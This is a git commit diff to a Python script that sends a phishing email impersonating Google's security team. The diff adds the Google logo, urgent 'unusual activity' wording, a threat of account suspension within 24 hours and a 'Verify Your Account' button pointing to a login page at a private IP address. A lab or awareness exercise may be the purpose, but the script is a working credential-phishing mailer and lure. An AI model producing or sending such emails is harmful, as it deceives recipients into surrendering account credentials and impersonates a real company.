40d6782a3db5d794d69b7207afb044530e47b4f1
Vinay Mummadi <vinaymummadi2025@gmail.com>
2026-03-28 13:27:55 +0000

    Update send_mail.py

--- send_mail.py
+++ send_mail.py
@@ -1,32 +1,57 @@
 import smtplib
 from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-sender = "it.admin.support.g00gle@gmail.com"
+sender = "it.adminsupport2@gmail.com"
 receiver = "mitnick.user@gmail.com"
 password = "your_app_password"
 
+msg = MIMEMultipart()
+msg["Subject"] = "Critical Security Update Required"
+msg["From"] = sender
+msg["To"] = receiver
+
 html = """
-Subject: Critical Security Update Required
-
 <html>
-<body>
-<p>Dear User,<br><br>
+<body style="font-family: Arial, sans-serif; color: #202124;">
 
-Click here to update your account:<br><br>
+<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="120"><br><br>
 
-<a href="http://192.168.0.200/login">
-https://accounts.google.com/security-update
+<p>Dear User,</p>
+
+<p>We detected unusual activity in your account. As part of our security measures, we require you to verify your account information immediately.</p>
+
+<p><b>Action Required:</b></p>
+
+<p>Please confirm your account details to avoid temporary suspension of your services.</p>
+
+<p>
+<a href="http://192.168.0.200/login" style="background-color:#1a73e8;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">
+Verify Your Account
 </a>
-
-<br><br>
-Regards,<br>
-Google Security Team
 </p>
+
+<p>If you do not complete this verification within 24 hours, your account access may be restricted.</p>
+
+<p>If you did not request this update, please ignore this email.</p>
+
+<br>
+
+<p>Regards,<br>
+Google Security Team</p>
+
+<hr>
+
+<p style="font-size:12px;color:gray;">
+This is an automated message. Please do not reply to this email.<br>
+© 2026 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA
+</p>
+
 </body>
 </html>
 """
 
-msg = MIMEText(html, "html")
+msg.attach(MIMEText(html, "html"))
 
 server = smtplib.SMTP("smtp.gmail.com", 587)
 server.starttls()
